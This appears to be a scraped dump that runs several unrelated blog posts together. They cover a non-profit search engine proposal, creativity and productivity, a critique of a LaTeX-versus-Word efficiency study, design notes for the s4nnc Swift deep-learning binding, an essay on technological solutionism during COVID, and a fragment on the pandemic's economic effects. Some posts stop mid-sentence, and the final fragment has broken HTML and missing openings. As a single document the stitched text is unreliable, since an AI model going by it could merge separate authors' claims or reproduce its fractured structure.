<p>Google is the <a href="https://www.smartinsights.com/search-engine-marketing/search-engine-statistics/">most widely-used search engine</a> in the world, and the company now offers hundreds of other services and products on top of search-based advertising. Personally, I think Google has done a great job improving search over the past two decades, but we are reaching a point where Google’s interests are colliding with offering honest search results to users.</p>
<h2 id="googles-competing-services">Google’s Competing Services</h2>
<p>All the way back in 2012, Yelp’s IPO statement cited Google as both its <a href="http://seekingalpha.com/article/399831-yelp-has-a-google-problem">biggest asset for gaining new users as well as its biggest competitor</a>. Because the site was the largest local business review site when it went public, it gathered much of its traffic from users who use Google to search for nearby businesses - especially those without a website or strong social media presence.</p>
<p>Since Yelp launched, Google has released its own competing review aggregator, which means that if Google wanted, they could force their results to the top of the list every time. This could effectively <em>kill</em> Yelp’s ability to get new users, and raises a lot of questions about Google’s monopoly on search and its effect on internet businesses.</p>
<h2 id="smart-phones-and-search-engines">Smart Phones and Search Engines</h2>
<p>A more recent frontier in the fight against Google is on smart phones. In 2020, the Justice Department <a href="https://www.justice.gov/opa/pr/justice-department-sues-monopolist-google-violating-antitrust-laws">brought a lawsuit against the search giant</a> accusing them of “anticompetitive and exclusionary practices,” related to the pressure they allegedly put on phone makers to default to their search engine.</p>
<p>Because Google owns one of the two biggest mobile operating systesm (Android), they have a lot of power to push users towards their search engine. It’s possible that this latest lawsuit could result in a large judgment against the company. A similar lawsuit <a href="https://www.pcmag.com/news/eu-fines-google-51b-for-abuse-of-power">filed in the European Union in 2018</a> led Google to change the way it bundles apps on Android phones.</p>
<h2 id="the-wiki-model-for-search">The Wiki Model for Search</h2>
<p>As Google’s intentions to integrate search with its own services more deeply has become clear, and I’ve been considering what a non profit search engine might look like.</p>
<p>A great model to look at for guidance is <a href="https://www.wikipedia.org/">Wikipedia</a>, the non-profit internet encyclopedia. Could having a crowdsourced, community-funded non-profit search engine be the way to save search engines from becoming cogs in a corporate advertising machine?</p>
<h3 id="spinning-off-a-not-for-profit-search-engine">Spinning Off a Not For Profit Search Engine</h3>
<p>Realistically, it’s not likely that a new competitor will be able to enter the search engine market and make any impact on Google’s market share. But, the US Justice Department or EU could split the company up.</p>
<p>For example, they could break Google up into multiple companies like they <a href="https://en.wikipedia.org/wiki/Breakup_of_the_Bell_System">did to the telephone companies in the 1980s</a>, or Google search could be turned into a public utility. This is <a href="https://www.project-disco.org/competition/030819-antitrust-in-60-seconds-public-utility-regulation/">how electric companies became publicly supported infrastructure</a>, so it’s not impossible that it could happen again.</p>
<h3 id="how-would-a-non-profit-search-engine-work">How Would a Non Profit Search Engine Work?</h3>
<p>Essentially, a non-profit search engine would allow users to drive improvements to the algorithm by reporting bad results or collaborating on improvements.</p>
<p>I would envision a core team with many contributors - much like open-source projects hosted on Github. While the basic functionality (crawling, link-tracking, etc.) would be the same as a search engine like Google, an impartial not for profit search engine could sidestep privacy pitfalls like Google’s <a href="http://searchengineland.com/googles-results-get-more-personal-with-search-plus-your-world-107285">SPYW</a> and the aforementioned Yelp problem.</p>
<p>Of course, there is room for abuse in this system as well, but there are numerous improvements to be had in a publicly visible model like this.</p>
<h2 id="the-best-option-today">The Best Option Today</h2>
<p>The closest thing we have today is <a href="https://duckduckgo.com/">DuckDuckGo</a>, which is closed-source and for-profit, but does not store personal data. This gives users some of the privacy-focused features that a non profit search engine might provide, but doesn’t answer the potential for abuse or eventual monopoly.</p>
<p><img src="https://i.imgur.com/OkT1Ljn.png" alt="DuckDuckGo search engine"></p>
<p>Earlier this year, I spent 3 months exclusively using DuckDuckGo as my search engine of choice. As a programmer, it was really challenging though. Google’s results have lots of context about my browsing behaviors, but DuckDuckGo doesn’t, so it takes a little massaging to get the results you might expect.</p>
<p>That said, DuckDuckGo did much better for non-technical search queries. For example, “watch Breaking Bad” takes you to a list of places you can watch the TV show “Breaking Bad.” The results are similar enough to Google’s that you probably wouldn’t notice the difference.</p>
<p>What do you think? Should there be a major player in the search engine market that is not for profit? Is it even necessary? Let me hear your thoughts on <a href="https://twitter.com/KarlLHughes">Twitter</a>.</p>

<p>There’s an important trade-off you need to make in order to be more creative: you need to be willing to <em>feel</em> less productive.</p>



<p>I say “feel” instead of “be” because productivity can be a really subjective and delusive game.</p>



<p>Even though efficiency freaks like to measure everything, what usually determines whether they were productive or not is their expectations. And those tend to be very high.</p>



<p>You should definitely work on adjusting your expectations about productivity. But, in the meantime, the best thing you can do is learn how to deal with unproductive guilt.</p>



<p>Because being more creative inevitably requires engaging in “unproductive” behaviors. Like sleeping, going for a walk (without your phone) or meditating.</p>



<p>Creativity is an unconscious and organic process. A great deal of the action happens behind the scenes. And like nature, it works on its own schedule.</p>



<p>You can foster and nurture creativity. But you can’t rush it.</p>



<p>Your mind needs time and space to chew experiences and information, process them, and make novel, interesting connections.</p>



<p>“Productive” people call it procrastination. For creatives, it is the making of a new idea.</p>

<p>
The boss needed item 3 inserted into a numbered list of hundreds of items.
The intern used a mouse to select the original 3 on the screen,
then typed 4,
then selected the original 4,
then typed 5,
then scrolled down,
then selected the original 5,
then typed 6,
and so on.
Another intern sat watching the screen to make sure there were no mistakes.
</p>
<p>
I happened to be in the room for other reasons.
I remember the horror of watching the beginning of this barbaric editing process.
Those poor interns!
</p>
<p>
When I enter a list of items into the computer,
what I'm typing doesn't look like
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but more like
</p>
<pre>     * ...
     * ...
     * ...
</pre>
<p>
Each asterisk is a special command to the computer,
telling the computer to automatically display the next number for the reader.
The reader eventually sees
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but that isn't what I typed.
This small difference produces a tremendous savings of time
whenever I insert an item, or delete an item, or move an item.
</p>
<p>
If I decide later
to skip the numbers
and use bullets instead,
I tell the computer
to introduce each list item with a bullet.
This is one command covering the whole list.
There's also a command that does the same thing
for the whole document.
There isn't separate work for each item.
It's no problem if a coauthor
later wants to change bullets back to numbers.
</p>
<p>
The interns, I suppose,
would be manually changing "1." and "2." and "3."
and so on to "•" and "•" and "•" and so on.
Or maybe they would be trying to figure out
how some search-and-replace feature could do the same thing;
let's hope the document doesn't have a sentence somewhere
that talks about something that happened in the year 2001.
Or maybe the interns would be quitting and finding a better job.
</p>
<p>
[Note added 2020.12.07:
I was expecting that many of my readers
would already be accustomed to relying on the computer
for automatic numbering.
I was surprised, however,
to see some comments along the lines of "Inconceivable!"
from readers unable to imagine
how the interns could have been in a different situation,
going through such a shockingly inefficient revision process.
Here's a hint:
Each item in the list looked like a flush-left paragraph,
like the paragraphs in this blog post,
adjacent to the left margin.
The text being selected by the mouse,
for example to change "3" to "4",
was to the right of the margin,
like the rest of the text in each item.]
</p>
<p>
<b>Abstraction as a time-saver for authors.</b>
This use of asterisks
is just one example of how I'm often typing something more abstract
than what's seen by the ultimate reader.
I don't type "Figure 12" or "see [41]", for example;
I type things like "Figure \ref{network-measurements}" and "see \cite{multiplication-survey}",
and I let the computer automatically convert
"\ref{network-measurements}" and "\cite{multiplication-survey}"
into numbers to display for the reader.
</p>
<p>
With one extra command,
covering the entire document,
I can tell the computer
to include section numbers
as part of all figure numbers in the document,
so that the figures are easier for the reader to find:
e.g., Figures 3.1 and 3.2 and 3.3 are in Section 3.
With another command,
again covering the entire document,
I can tell the computer
to cite all authors by name rather than by number.
</p>
<p>
As another example,
I was recently editing a mathematical paper,
and I decided that a particular concept
would be easier for the reader to remember
if I changed the notation that I was using for the concept.
The notation was all over the paper,
but this change took just a few seconds of editing.
I had given a name to the concept,
had told the computer <i>once</i> to display this name as a particular notation,
and had then typed this name throughout the paper,
so there was only one place where I had to change the notation.
</p>
<p>
Of course one can't,
and shouldn't try to,
prepare in advance for <i>every</i> possible change to a document.
But it's not hard to prepare for the most likely changes.
This small initial effort
saves a tremendous amount of time later.
When I say "small",
I'm including the effort to select a document-creation system
that's designed to
<a href="https://en.wikipedia.org/wiki/LaTeX">make this sort of thing easy</a>.
</p>
<p>
(As a side note,
programmers will recognize this strategy
as an example of the
<a href="https://en.wikipedia.org/wiki/Information%5Fhiding">information hiding</a>
strategy introduced by Parnas,
and will recognize that modern program-creation systems
are designed to make this easy.)
</p>
<p>
Microsoft Word isn't completely missing abstractions,
but these abstractions
are competing for user-interface resources
against features encouraging the user
to work at lower abstraction layers.
The extra effort to use the abstractions
ends up pushing users into doing something simpler,
something that just works now,
and paying heavily for this choice
later when the document is being revised.
</p>
<p>
Have I done a scientific study
<i>proving</i> that Microsoft Word
is less efficient than LaTeX?
No.
I'd love to see a careful study of this topic.
Short-term,
this would help guide new authors to make sensible choices.
Longer-term,
insights from this sort of study could be the basis for further improving
our document-creation systems.
I certainly don't think that the existing systems are perfect.
(<a href="https://cr.yp.to/writing/visual.html">Example.</a>)
</p>
<p>
Imagine, however, that a study looks only at
<i>the time for someone looking at a printout to create a document matching this printout</i>.
This would be blind to the time for subsequent edits.
This would be blind to the suffering of those interns.
This would incorrectly conclude that typing
"1. ... 2. ... 3. ..." and "see [41]"
is more efficient than typing
"* ... * ... * ..." and "see \cite{multiplication-survey}".
It <i>is</i> slightly more efficient in this limited metric,
but it is much less efficient in the metric that matters,
namely the total time spent by the user.
</p>
<p>
<b>An example of a "scientific" study.</b>
At this point you're probably thinking that
nobody could possibly miss such an obvious issue.
This brings me to the main topic of this blog post,
a 2014 peer-reviewed study
<a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0115069">"An Efficiency Comparison of Document Preparation Systems Used in Academic Research and Development"</a>
by two psychologists,
Knauff and Nejasmic ("KN").
</p>
<p>
Participants in the study were given a page of text
and were given a limited time to type the page into the computer.
There were three different types of text:
</p>
<ul>
<li>simple prose with a few footnotes;
</li>
<li>a page with a complicated table of data;
and
</li>
<li>a page with many mathematical formulas.
</li>
</ul>
<p>
Participants were scored
on the basis of how much text they typed and how accurately they typed it.
The time was so rushed that a significant fraction of participants
didn't finish typing the whole page,
even for the case of simple prose.
</p>
<p>
The study considered two document-creation systems:
LaTeX and Microsoft Word,
in each case with "all tools, editors, plug-ins, and add-ons"
that participants were "accustomed to using".
Of course different "add-ons" could have different efficiency,
and of course there are other document-creation systems,
but these are topics for another blog post.
</p>
<p>
The study produced many pages of results,
which I'll summarize by saying that
Word did slightly better on the prose
and much better on the table,
while LaTeX did better on the formulas.
The study authors made no effort to measure any subsequent document-editing step.
</p>
<p>
<b>Slithering from one metric to another.</b>
The fundamental mistake in the KN paper
is the change of cost metric.
</p>
<p>
The original question was how efficiently authors are creating documents:
in particular, how efficiently authors are creating academic research papers.
KN claimed in their title to be comparing "efficiency"
of "document preparation systems used in academic research".
But they then quietly changed this metric in three ways:
</p>
<ul>
<li>
They considered only the efficiency of an initial fragment of the document-creation process,
ignoring the time spent revising documents.
They provided no reason to believe that the efficiency of this fragment
was well correlated with what they had previously claimed to be measuring.
Nothing in their paper acknowledges
the most obvious reason for a negative correlation,
namely that slightly more work at the outset
makes revisions much easier later.
In my experience,
document-creation systems vary in how well they support this work.
</li>
<li>
KN didn't even measure the time taken for this initial fragment of the process.
Instead they imposed a rushed time limit,
and measured how incomplete and inaccurate the resulting document was.
Again they provided no reason to believe that what they measured
was well correlated with what they had previously claimed to be measuring.
Perhaps they were assuming that more mistakes will take more time to fix,
but my experience is that some types of mistakes are much easier to fix than others,
and that document-creation systems vary in the types of mistakes they encourage.
</li>
<li>
KN didn't even measure creating a <i>new</i> document,
which is what academics are actually spending their time doing.
People who were writing papers in the age of typewriters
will remember writing and editing papers <i>by hand</i>
before tediously typing the final pages,
but that was because editing a typed page
ranged from annoying
(<a href="https://en.wikipedia.org/wiki/Correction%5Ffluid">white-out</a>,
or sometimes scissors and tape)
to super-annoying
(retyping the whole page).
Today the initial writing on paper is skipped,
and typing is interleaved in small chunks
with parts of the author's thought process,
making the typing process much less boring.
I'm continually re-reading
and thinking about what I just typed.
Is the error rate of the academic's modern typing process
well correlated with the error rate of the
archaic retyping process that KN measured?
Again KN provide no reason to believe this.
</li>
</ul>
<p>
Did KN use the honest title
"A comparison of the unreliability of
rushed retyping of a page
using document preparation systems
that are also used for academic research and development"?
No.
Would you expect a journal to accept a paper
with such a title?
</p>
<p>
Instead they used a title …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>From the onset of implementing <a href="https://libnnc.org/">libnnc</a>, it meant to be a common ground for higher-level language bindings beyond Python. The underlying architecture has been stable for a year or so, and I have been using it for some personal projects for a while. But the raw C interface is not the easiest to use, it is the time to implement some high-level language bindings for that library.</p>

<p>The default high-level language for deep learning likely would be Python. However, I am not happy with how it performs on a typical many-core system even with things that are supposed to help. Swift, on the other hand, has no issues with saturating my many-core system and it has a reasonable <a href="https://github.com/pvieito/PythonKit">Python binding</a> to tap into the rich Python tool-kits. Not to mention the <em>calling C functions from Swift</em> path is as easy as you possibly can get.</p>

<p>This conviction resulted <a href="https://github.com/liuliu/s4nnc">s4nnc</a>, a Swift language binding for <a href="https://libnnc.org/">libnnc</a>. Because <a href="https://github.com/liuliu/s4nnc">s4nnc</a> is a pure interface to interact with the underlying deep learning library. I paid close attention to its API design. Below are some design notes around why it is, and how Swift as a language fares on such a task. If you want to read the introduction to s4nnc, feel free to visit the <a href="https://github.com/liuliu/s4nnc">GitHub homepage</a>.</p>

<h3 id="what-is-a-deep-learning-library-api">What is a Deep Learning Library API</h3>

<p>A good deep learning API to me, can be largely modeled after <a href="https://keras.io/">Keras</a> and <a href="https://pytorch.org/">PyTorch</a>. It concerns, above all, with 2 questions:</p>

<ol>
  <li>How to specify a deep learning model?</li>
  <li>How to construct a training loop?</li>
</ol>

<p>Everything else is nice-to-have and largely orthogonal to these two questions (but these whistles-and-bells are a lot of hard work!).</p>

<p>A training loop consists of a repeated sequence of operations to: evaluate a model, compute gradients against the loss, apply gradients to update model parameters.</p>

<p>The details can be flexible: you could evaluate one part of the model in one round, and another part in another round; you could have different losses for different model outputs each round; you could modify the gradients, scale them, truncate them to whatever you liked; and you could apply gradients to update different model parameters with different optimizers. But at the core, I didn’t see much changes for this 3-step throughout many model training code.</p>

<p>What constitutes a model can be more interesting, but it seems we converged to a concept where a model consists of some inputs, some outputs, and some parameters. Particularly, parameters are stateful and internals to the model itself. Go beyond that, a model could have different inputs / outputs and different input / output shapes during the training loop. However, the shapes and number of parameters during the training are likely to be constant.</p>

<h3 id="basic-data-types">Basic Data Types</h3>

<p>A deep learning library operates on multi-dimensional arrays (or tensors). In Swift, a concrete tensor can be represented as a value type like <code>Array</code> itself in Swift. That means the <code>Tensor</code> type would need things such as copy-on-write to implement said value-type semantics. Extra attention needs to be paid to make sure throughout the implementation of the API, no unnecessary copy was made. This value-type choice is a bigger deal than it sounds (it sounds like a no-brainer given <a href="https://www.tensorflow.org/swift">S4TF</a> made exactly the same choice) because in Python, everything is a reference type.</p>

<p>This becomes more interesting when deciding whether <a href="https://libnnc.org/tech/nnc-dy/">tensor variables</a> could be value types or not. Tensor variable is an abstract tensor type which you can compute gradients (has a <code>grad</code> property). It is bound to a computation graph, and can be the parameter to update during the training loop. While it is possible to make many functions associated with tensor variables taking <code>inout</code> parameters and marking some of tensor variables’ functions as <code>mutating</code>, the more hairy part is about updates during the training loop.</p>

<p>In <a href="https://pytorch.org/docs/stable/optim.html">PyTorch</a>, an optimizer takes a list of parameters and then applies new gradients to update these parameters when <code>step()</code> method is called. This is possible because parameters are reference types in Python. Any updates to the parameters will be reflected to the model who holds these parameters. This is not possible if tensor variables are value types. In Swift, you cannot hold a reference to a value type.</p>

<p>Thus, practically, tensor variables have to be implemented as reference types in Swift.</p>

<p>Despite my best intention, it turns out most of the objects, including <code>Graph</code>, <code>Model</code>, <code>StreamContext</code> are still implemented as reference types. It is possible for some of them (for example: the <code>Model</code>) to be value types. The lack of <code>deinit</code> in <code>struct</code> requires us to wrap a reference type inside a value type to create such API. At the end of day, I don’t see much of the value from API aesthetics or performance-wise to make these value types.</p>

<h3 id="automatic-differentiation">Automatic Differentiation</h3>

<p>While Swift has <a href="https://forums.swift.org/t/differentiable-programming-for-gradient-based-machine-learning/42147">a proposal for automatic differentiation</a>, the automatic differentiation right now is implemented at library level and only applicable to models and tensor variables.</p>

<p>On the API side, it is popular to have a <code>backward()</code> method on the final loss variable. The said method will compute gradients against all variables associated with the final computation of the loss.</p>

<p>This also means we need to keep track of all variables in the computation graph, unless some point is reached and we can free them. In PyTorch, such point is when the <code>step()</code> method is called.</p>

<p><a href="https://libnnc.org/tech/nnc-dy/#optimizations">libnnc early on made the decision to avoid holding vast amount of memory by default</a>. That resulted in the interface <code>backward(to tensors: Sequence&lt;Tensor&gt;)</code> where you have to specify to which tensors you compute the gradients against. Because we are doing backward-mode AD, we still compute gradients on all variables up until these tensors. But we don’t compute gradients against variables passed that point. In effect, we can rely on reference-counting to free memory associated with tensors beyond that point.</p>

<p>In return for this a bit more complex interface, you don’t have to worry about scoping to <code>no_grad</code> to avoid unbounded memory allocations.</p>

<h3 id="optimizers-in-the-training-loop">Optimizers in the Training Loop</h3>

<p>An optimizer in a deep learning library represents a particular gradient descent method associated with some parameters to update each round.</p>

<p>One particular challenge is about how to use multiple optimizers with different parameters in one round. While for simpler cases, you could call <code>step()</code> many times in one round. It may be more efficient to call <code>step()</code> once.</p>

<p>Swift makes this particular choice easier by supporting extensions on built-in types.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>public</span> <span>extension</span> <span>Collection</span> <span>where</span> <span>Element</span><span>:</span> <span>Optimizer</span> <span>{</span>
  <span>func</span> <span>step</span><span>()</span> <span>{</span>
    <span>...</span>
  <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is a good starting point to support more concise updates such as: <code>[adam1, adam2].step()</code>.</p>

<p>The same pattern can be applied if you want to support gradients with multiple losses: <code>[loss1, loss2, loss3].backward(to: x)</code>.</p>

<p>These extension methods are conditional, and type-safe in Swift.</p>

<h3 id="operators">Operators</h3>

<p>While Swift allows operator overloading and the ability to introduce custom operators, somehow the ambiguity of <code>*</code> is not addressed. We cannot have consistency with Python because <code>@</code> cannot be overloaded in Swift language. I have to resort to <code>.*</code> and <code>.+</code> for element-wise multiplications and additions.</p>

<h3 id="type-safe-functions">Type-safe Functions</h3>

<p>While Swift can enforce some type consistency, without more language level changes, we cannot deduce shapes, and would still encounter runtime errors if shape doesn’t match. Even with language-level support, we may still need an escape-hatch because some tensors could be loaded from IO. Not to mention it would be nice to support dynamic input shapes to a model while it can still statically compute its parameter shapes.</p>

<h3 id="transparent-multi-gpu-data-parallel-training">Transparent Multi-GPU Data Parallel Training</h3>

<p>One thing annoying in the raw C interface, is the transition from one GPU to multi-GPU, even with simple data-parallel models. Unable to abstract tensor to higher-level in C makes the code unnecessarily complex.</p>

<p>Fortunately, with basic generics, this is not a problem in Swift. However, to use such generics turns out to be more complicated than I expected on the library author side. If I want to avoid runtime type-check (<code>is</code> / <code>as</code> keyword), there are quite a bit of protocol / extension type dance I would need to do. This doesn’t help with Swift’s borderline hostility against protocol-associated types. Luckily, there are <a href="https://forums.swift.org/t/improving-the-ui-of-generics/22814/">new proposals</a> to lift some of the restrictions (and no, <code>some</code> is not all it needs). You can see <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/Functional.swift#L3">this monstrosity here</a>. At the end, I have to introduce <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/Optimizer.swift#L125">some</a> <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/ModelBuilder.swift#L65">runtime</a> <a href="https://github.com/liuliu/s4nnc/blob/main/nnc/Store.swift#L31">type-checks</a> to keep my sanity.</p>

<h3 id="closing-words">Closing Words</h3>

<p>I am pretty happy with the end result of <a href="https://github.com/liuliu/s4nnc">s4nnc</a>. It is small, versatile and does exactly what I set out to: an ergonomics win from the raw C interface. Generics, type-safety and reference-counting in Swift the language really made a difference in the API ergonomics. The language itself is not the fastest, but has a good balance in ergonomics, expressivity and performance. In the next blog post, I am going to detail the Swift data science workflow I had, and why we moved to this from the initial Python one. Stay tuned!</p>

December 6, 2020 | https://aelkus.github.io/theory/2020/12/03/solu.html | <a href="https://web.archive.org/web/*/https://aelkus.github.io/theory/2020/12/03/solu.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Economist Noah Smith <a href="https://noahpinion.substack.com/p/climate-change-isnt-that-hard">is fed up with</a> generic critiques of technological “solutionism,” specifically what he calls the “2010s consensus that technology is a sideshow compared to social movements.”</p>

<blockquote>
  <p>In the last decade, we’ve basically been taught to deride “solutionism” — while Silicon Valley techbros were bending their genius toward figuring out ways to sell more ads or lower taxi drivers’ wages, inequality was running rampant and parents were struggling to feed their kids. Instead of trusting wizardry to solve the world’s problems, we were supposed to place our faith in politics, in mass action, and in cultural change.</p>

  <p>Except then consider what happened with COVID. Our leaders failed to fight the virus effectively, and the President actively sabotaged containment efforts. Culturally, we screeched our heads off about masks and herd immunity and “just the flu” and beach parties and school closings and bar closings and restaurant closings and dorm closings and so on and so forth. We didn’t implement strict lockdowns and we protested against lockdowns and we didn’t even obey the half-assed lockdowns we did implement. We became one of the planet’s worst-hit countries, despite having the planet’s most expensive health care system. We died in the red states, we died in the blue states. We died in droves, in hundreds of thousands. Collectively, as a society, we wrung our hands and ran in circles and screeched and died and screeched and died and screeched and died until scientists made vaccines against the virus.</p>
</blockquote>

<p>Is this correct? In some ways, Smith stacks the deck in his favor. Scientific breakthroughs on vaccines can be produced by small groups of experts insulated from public pressure and the clown show of 21st century American politics. This was never the case with non-pharmaceutical interventions, even if I share Smith’s sense out of outrage and horror over America’s failed response to COVID.</p>

<p>Comparing them is a little akin to comparing World War II’s military-technical research achievements to the great campaigns of Europe and the Pacific War. The latter required extensive political and organizational coordination on a hitherto unprecedented scale, and buy-in from millions of ordinary people. The former were not exactly a bunch of eggheads in a seminar room, but they represent at least crudely processes that are largely autonomous from the need to attain large-scale consensus and cooperation.</p>

<p>Come next year, when we enter into the challenge of rolling out vaccines while preserving basic social distancing measures, we will get a reminder of how different these two kinds of activities are. I’m more optimistic that next year will be significantly better than 2020 was, but only guardedly. However, Smith is also on to something larger when he notes the dubious framing of how the answer to engineering our way to nirvana is supposed to be large-scale political and cultural change driven by mass popular mobilization.</p>

<p>‘Political solution’ in this framing seems to be a euphemism for either a deliberative process that harmonizes competing views or (more often) the imposition of one’s will on the body politic via political struggle. Neither look particularly promising in a polarized society in which merely putting on a piece of cloth held together with string has become a <a href="https://www.pewresearch.org/politics/2020/06/25/republicans-democrats-move-even-further-apart-in-coronavirus-concerns/">partisan issue</a>. Moreover, Smith <a href="https://www.bloomberg.com/opinion/articles/2019-10-17/california-is-back-on-the-brink-of-being-a-failed-state">observes elsewhere</a> that even in my home state of California – where GOP opposition has been virtually eradicated – single-party dominance has failed to resolve basic governance issues.</p>

<p>Certainly most thoughtful critics of techno-determinism likely will say that they aren’t categorically against the use of technology, but rather criticize a particular mindset that uncritically postulates that objective solutions can be discovered to objectively framed problems and then objectively implemented and accepted by a mostly cooperative public. However, it is hard to tell if they are talking about the technologists or themselves when they make this criticism. Statements like “if only we had the political will” to do something of interest are just as naive as “if only we had the right app.”</p>

<p>Technologists are often criticized for wanting to ‘route around’ the US political system, but <a href="https://www.pewresearch.org/fact-tank/2019/07/22/key-findings-about-americans-declining-trust-in-government-and-each-other/">given</a> low institutional trust and increasingly low interpersonal trust, it is difficult to be entirely critical of that desire. The biggest problem with it is that it often devolves into fantasies of taking one’s toys and exiting into an autonomous space free of the need to gain mass consensus (seasteading!) or instituting impersonal mechanisms that suppress political resistance (make the AI president!) There are idiots. Look around. But we’re all idiots in some shape or form and we’re stuck with each other. What do we do next?</p>

<p>First, somewhat of a meta-point: indirection often is a very underrated way of creating change. Part of what this post is looking to encourage is something I sometimes refer to as the “Andrew Marshall style” of change. For decades, Marshall headed up the Office of Net Assessment (ONA) within the United States Department of Defense. Most people interested in defense and strategy, including yours truly, have in some way directly or indirectly benefited from ONA and its projects. But Marshall did so largely below the radar.</p>

<p>Demanding only autonomy, a tiny (by Pentagon standards) budget, a small office, and the freedom to report directly to the Secretary of Defense, Marshall at first glance took a rather counter-intuitive approach. But this was actually critical to his success. He was not a threat to other people’s bureaucratic rice bowls. But he preserved his own autonomy. And by slowly building up a network of relationships and becoming a hub for innovative work, ONA ended up exercising a profound influence on American national security and defense.</p>

<p>What is remarkable about Marshall’s success is that he propagated his particular institutional relationships forward through decades of changing political, economic, and bureaucratic turmoil while slowly altering the surrounding environment around him. It would be ridiculous to assert that Marshall is singularly responsible for any particular major shift in American national security and defense, but it is also very evident that ONA’s presence and persistence changed the boundary conditions of the US defense and security system.</p>

<p>While many technologists often valorize another Cold War American defense icon – John Boyd – Marshall is also a model worth emulating. Technology is complicated, frustrating, and more often than not disappointing relative to our ambitions. But it can change the boundary conditions of problems. Tweaking the boundary conditions of problems is a big part of how meaningful change can happen overall.</p>

<p>Getting 2-3 promising vaccines in under a year is a great example. Vaccines do not change the massive amount of political and institutional failures America has experienced since the COVID-19 outbreak began. However, consider the alternative world without vaccines that we were in only a short time ago. We had all of those problems but without any kind of roadmap as to how we might escape them. Now we have a <a href="https://www.forbes.com/sites/carlieporterfield/2020/11/15/heres-when-experts-say-things-could-get-back-to-back-to-normal-after-coronavirus/?sh=3f66c9d936ed">hazy but nonetheless meaningful</a> idea of how long it could take to get back to normal, even if there is no really coherent shared idea of ‘normality.’ This is worth celebrating!</p>

<p>Even without a vaccine, we would be much worse off than we are now if everything from the physical network backbone to distributed work solutions did not perform well under significant stress. The Internet, also created originally in part for the purpose of scientific collaboration, enabled scientific researchers around the world to work together at breakneck speed to learn as much as possible about a novel virus and figure out how to attack it. Outside of the US and most <a href="https://www.atlanticcouncil.org/blogs/new-atlanticist/lessons-from-taiwans-experience-with-covid-19/">successfully in Taiwan</a>, governments have also found success in working together with the private sector to manage information flows during the pandemic.</p>

<p>Beyond COVID, what might this mean? Even in the best of times, the <a href="https://texaspolitics.utexas.edu/archive/html/bur/features/0303_02/muddling.html">most</a> we can often accomplish on the most intractable social problems is to <a href="https://texaspolitics.utexas.edu/archive/html/bur/features/0303_02/muddling.html">muddle through</a>. They have <a href="https://link.springer.com/article/10.1007/BF01405730">no inherent point</a> at which they officially stop being problems, and often no inherently correct shared framing. It doesn’t mean that action is pointless, but true students of politics often understand that politics is a secular activity instead of a means of bringing about religious salvation.</p>

<p>It seems unwise to stake our hopes on some kind of decisive reckoning at which political solutions will somehow materialize and then be imposed on our friends, neighbors, and co-workers. Much for the same reason that many of us find that we cannot get even members of our own family to take sensible COVID precautions no matter how much we plead, cajole, and threaten them. Still, we have also seen what happens when we simply stand still and do nothing.</p>

<p>“Techno-scientific” changes in the surrounding environment can do a number of salient things. They can provide tools we did not have before to mitigate problems. They can subtly influence or even shift the dynamics of particular interpersonal and institutional relationships and interactions. New frontiers to explore can distract people that otherwise would make trouble, and a bigger pie can make people feel more generous than they otherwise would be. While much has been made of the costs of technological disruption, breaking up established social hierarchies can be necessary for the system as a whole to survive and grow.</p>

<p>Preventing stasis and injecting more slack into the system are both means to the same end: propagating the system forward into the future. So technological “solutionism” (a term I have always disliked due to its imprecision), is both more and less important than ever. It certainly falls short of the hopes of its biggest boosters and the fears of its opponents. But if you are a technologist looking to make a difference now is as good of a …</p></div></div>

Will companies determine that workers are just as productive from home and fully embrace remote work? Will consumers permanently close the door on shopping at brick-and-mortar stores in favor of ordering groceries and supplies online?</p>
<p data-v-4387a7d2="" data-v-03c6dd16="" data-v-7ba8d775="">To investigate the means through which these shifts could happen—and the likelihood that they will—we identified three main ways the coronavirus could shape the economy long after the pandemic has subsided:</p>

As an example of the impact of habits, consider the rise of recycling in the United States over the past several decades. This shift was due in part to the advent of Earth Day in 1970 and the nationwide campaign encouraging Americans to "reduce, reuse, recycle."&nbsp;<a tabindex="0" href="https://www.epa.gov/sites/production/files/2018-07/documents/2015_smm_msw_factsheet_07242018_fnl_508_002.pdf" data-v-55c87dd6="" data-v-03c6dd16="" data-v-e8029e64="">The Environmental Protection Agency</a>&nbsp;reported that 34.7% of municipal solid waste was recycled in 2015, as compared with 6.6% in 1970.</li>

<li data-v-e8029e64="" data-v-03c6dd16=""><strong>Sunk costs</strong>, or costs that have already been incurred and cannot be recouped, could change the long-term plans of consumers and firms.

Companies and industries impacted by this reduction in demand are&nbsp;</span><a tabindex="0" href="https://www.morningstar.com/articles/1003476/33-undervalued-stocks-for-the-fourth-quarter" data-v-55c87dd6="" data-v-03c6dd16="" data-v-4387a7d2="">underperforming in the market</a><span>, implying that investors think it will.</span></p><p><span>Many of the industries shaped by changes in habits are the same ones that could be impacted by fear of the next pandemic or a COVID-19 resurgence. It's difficult to predict how this fear will shape consumer behaviour—especially once an effective vaccine is developed and distributed—but awareness around the possibility of another pandemic may linger in people's minds. While the odds that anyone will continue to avoid eating in a restaurant because of that risk seem low, it's possible that fear may remain around the largest and densest kinds of social gatherings (such as public transit or air travel).</span></p><p><span>There's also the matter of sunk costs, which are probably the least intuitive and least discussed of the three concepts. Essentially, the pandemic has forced consumers and firms to incur costs they otherwise would not have; for instance, purchasing home office equipment to facilitate remote working. Once the pandemic is over, the impetus for the purchase decision will have disappeared, but people will still have the home office equipment, so working from home will continue to be marginally more attractive.</span></p><p><span>Sunk costs can also come in other, nonmonetary forms, like time. Consider that the surge in working from home has required extensive time on the part of managers, as they've needed to craft work-from-home capabilities, such as drawing up policies and learning the best ways to communicate with remote workers. This may not have been considered a valuable use of their time before the pandemic, but now that firms have been forced to incur this cost, the issue is no longer relevant, and the necessary work-from-home systems are in place.</span></p><p><span>Similarly, consumers also have limited amounts of time. When people turned to shopping online instead of at brick-and-mortar stores because of social distancing, previously reluctant consumers acclimated themselves to e-commerce out of necessity. 